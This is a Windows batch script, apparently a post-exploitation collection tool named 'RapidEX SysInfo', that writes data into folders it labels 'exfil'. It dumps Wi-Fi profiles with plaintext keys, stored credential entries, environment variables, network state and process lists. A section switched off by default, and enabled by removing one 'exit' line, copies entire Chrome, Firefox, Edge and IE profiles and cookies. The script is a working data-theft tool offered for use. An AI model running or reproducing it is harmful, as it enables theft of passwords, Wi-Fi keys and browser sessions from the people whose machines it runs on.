@echo off
title RapidEX SysInfo %COMPUTERNAME%

@echo This is free and unencumbered software released into the public domain.

@echo Anyone is free to copy, modify, publish, use, compile, sell, or
@echo distribute this software, either in source code form or as a compiled
@echo binary, for any purpose, commercial or non-commercial, and by any
@echo means.

@echo In jurisdictions that recognize copyright laws, the author or authors
@echo of this software dedicate any and all copyright interest in the
@echo software to the public domain. We make this dedication for the benefit
@echo of the public at large and to the detriment of our heirs and
@echo successors. We intend this dedication to be an overt act of
@echo relinquishment in perpetuity of all present and future rights to this
@echo software under copyright law.

@echo THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
@echo EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
@echo MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
@echo IN NO EVENT SHALL THE AUTHORS BE LIABLE FOR ANY CLAIM, DAMAGES OR
@echo OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE,
@echo ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR
@echo OTHER DEALINGS IN THE SOFTWARE.

@echo For more information, please refer to unlicense.org

set RAPIDEX_HOME=%CD%
set EXFIL_HOST=%RAPIDEX_HOME%\%COMPUTERNAME%
set EXFIL_NETWORK=%EXFIL_HOST%\network
set EXFIL_USER=%EXFIL_HOST%\%USERNAME%
set EXFIL_BROWSER=%EXFIL_USER%\browser
set EXFIL_FILES=%EXFIL_HOST%\file_listing

@echo Creating directories for exfil in %EXFIL_HOST%

mkdir "%EXFIL_HOST%"    2> NUL
mkdir "%EXFIL_NETWORK%" 2> NUL
mkdir "%EXFIL_USER%"    2> NUL
mkdir "%EXFIL_BROWSER%" 2> NUL
mkdir "%EXFIL_FILES%"   2> NUL

cd "%EXFIL_HOST%"
REM system info is a bit slow so start it in a new process
start /b systeminfo > "%EXFIL_HOST%\systeminfo.txt"

@echo Networking...
netsh wlan export profile folder="%EXFIL_NETWORK%" key=clear > NUL
ipconfig          > "%EXFIL_NETWORK%\ipconfig.txt"
arp -a            > "%EXFIL_NETWORK%\arp.txt"
netstat -anq      > "%EXFIL_NETWORK%\netstat.txt"
@echo netstat -aq > "%EXFIL_NETWORK%\netstat_dns.txt"
net share         > "%EXFIL_NETWORK%\shares.txt"

@echo EnvVars...
set > "%EXFIL_HOST%\env.txt"

@echo Users...
dir C:\Users\ > "%EXFIL_HOST%\users.txt"

@echo Credentials...
cmdkey /list > "%EXFIL_HOST%\credentials.txt"

@echo Storeage devices...
wmic logicaldisk get deviceid, volumename, description > "%EXFIL_HOST%\drives.txt"

@echo Process Listing...
tasklist > "%EXFIL_HOST%\tasklist.txt"

@echo Driver Listing...
driverquery > "%EXFIL_HOST%\driverquery.txt"

@echo File Associations...
ftype > "%EXFIL_HOST%\fileassoc.txt"

@echo File Listing...
dir "%ProgramFiles(x86)%" > "%EXFIL_FILES%\ProgramFiles(x86).txt"
dir "%ProgramFiles%" > "%EXFIL_FILES%\ProgramFiles.txt"

@echo ***************************************************************************
@echo The follow sections, full directory listing, and grabbing browser profiles
@echo are very slow, so they are disabled by default.
@echo To execute them simply comment out the following line
exit
@echo ***************************************************************************

for /f "skip=1" %%x in ('wmic logicaldisk get caption') do %%x & cd \ & tree /a /f %%x >> "%EXFIL_FILES%\Full_Dir_Listing.txt"

@echo Group Policy...
GPRESULT /R > "%EXFIL_HOST%\grouppolicy.txt"

@echo Browser User Profiles...
@echo Grabbing Chrome
mkdir %EXFIL_BROWSER%\chrome
xcopy /E /C /G /H /Y /Q "%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default" "%EXFIL_BROWSER%\chrome"

@echo Grab Firefox
mkdir %EXFIL_BROWSER%\firefox
xcopy /E /C /G /H /Y /Q "%USERPROFILE%\AppData\Roaming\Mozilla\Firefox\Profiles" "%EXFIL_BROWSER%\firefox"

@echo Modern Edge and IE hide cookies, but we'll try anyway...

@echo Grab Edge
mkdir %EXFIL_BROWSER%\edge
xcopy /E /C /G /H /Y /Q "%USERPROFILE%\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe" "%EXFIL_BROWSER%\edge"

@echo Grab IE
mkdir "%EXFIL_BROWSER%\ie\cookies"
xcopy /E /C /G /H /Y /Q "%USERPROFILE%\Local\Microsoft\Windows\INetCookies" "%EXFIL_BROWSER%\ie\cookies"
mkdir "%EXFIL_BROWSER%\ie\favorites"
xcopy /E /C /G /H /Y /Q "%USERPROFILE%\Favorites" "%EXFIL_BROWSER%\ie\favorites"

exit